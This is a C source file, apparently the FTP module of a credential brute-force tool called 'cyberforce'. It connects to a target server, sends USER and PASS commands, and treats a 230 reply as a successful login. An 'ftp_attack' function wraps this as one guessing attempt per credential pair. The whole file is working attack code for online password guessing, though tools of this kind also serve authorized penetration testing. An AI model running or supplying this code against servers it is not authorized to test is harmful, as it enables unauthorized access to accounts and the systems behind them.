#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define close closesocket
    typedef int socklen_t;
#else
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <sys/socket.h>
#endif

#include <sys/time.h>
#include <errno.h>
#include "include/cyberforce.h"
#include "include/defines.h"

#ifdef _WIN32
static int winsock_initialized = 0;

static void init_winsock() {
    if (!winsock_initialized) {
        WSADATA wsa_data;
        WSAStartup(MAKEWORD(2, 2), &wsa_data);
        winsock_initialized = 1;
    }
}
#endif

int ftp_connect(const char *host, int port, int timeout) {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    struct timeval tv;
    
#ifdef _WIN32
    init_winsock();
#endif
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    
    // Set timeout
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
    
    server = gethostbyname(host);
    if (!server) {
        close(sockfd);
        return -1;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    server_addr.sin_port = htons(port);
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

int ftp_read_response(int sockfd, char *buffer, size_t size) {
    fd_set readfds;
    struct timeval tv;
    int n;
    
    FD_ZERO(&readfds);
    FD_SET(sockfd, &readfds);
    
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    
    if (select(sockfd + 1, &readfds, NULL, NULL, &tv) <= 0) {
        return -1;
    }
    
    n = recv(sockfd, buffer, size - 1, 0);
    if (n <= 0) {
        return -1;
    }
    
    buffer[n] = '\0';
    return n;
}

int ftp_send_command(int sockfd, const char *command) {
    char buffer[BUFFER_MEDIUM];
    snprintf(buffer, sizeof(buffer), "%s\r\n", command);
    
    return send(sockfd, buffer, strlen(buffer), 0);
}

int ftp_login(int sockfd, const char *username, const char *password) {
    char response[BUFFER_MEDIUM];
    int result;
    
    // Send USER command
    char user_cmd[BUFFER_SMALL];
    snprintf(user_cmd, sizeof(user_cmd), "USER %s", username);
    
    if (ftp_send_command(sockfd, user_cmd) < 0) {
        return 0;
    }
    
    result = ftp_read_response(sockfd, response, sizeof(response));
    if (result < 0 || !strstr(response, "331")) {
        return 0;
    }
    
    // Send PASS command
    char pass_cmd[BUFFER_SMALL];
    snprintf(pass_cmd, sizeof(pass_cmd), "PASS %s", password);
    
    if (ftp_send_command(sockfd, pass_cmd) < 0) {
        return 0;
    }
    
    result = ftp_read_response(sockfd, response, sizeof(response));
    if (result < 0) {
        return 0;
    }
    
    // Check if login was successful
    if (strstr(response, "230")) {
        return 1; // Success
    }
    
    return 0; // Failure
}

int ftp_attack(Config *config, const char *username, const char *password, AttackResult *result) {
    int sockfd;
    char response[BUFFER_MEDIUM];
    
    // Connect to FTP server
    sockfd = ftp_connect(config->target, config->port, config->timeout);
    if (sockfd < 0) {
        if (config->verbose >= 2) {
            fprintf(stderr, "[-] Failed to connect to FTP server\n");
        }
        return 0;
    }
    
    // Read welcome message
    if (ftp_read_response(sockfd, response, sizeof(response)) < 0) {
        close(sockfd);
        return 0;
    }
    
    // Attempt login
    int success = ftp_login(sockfd, username, password);
    
    // Send QUIT command
    ftp_send_command(sockfd, "QUIT");
    
    close(sockfd);
    return success;
}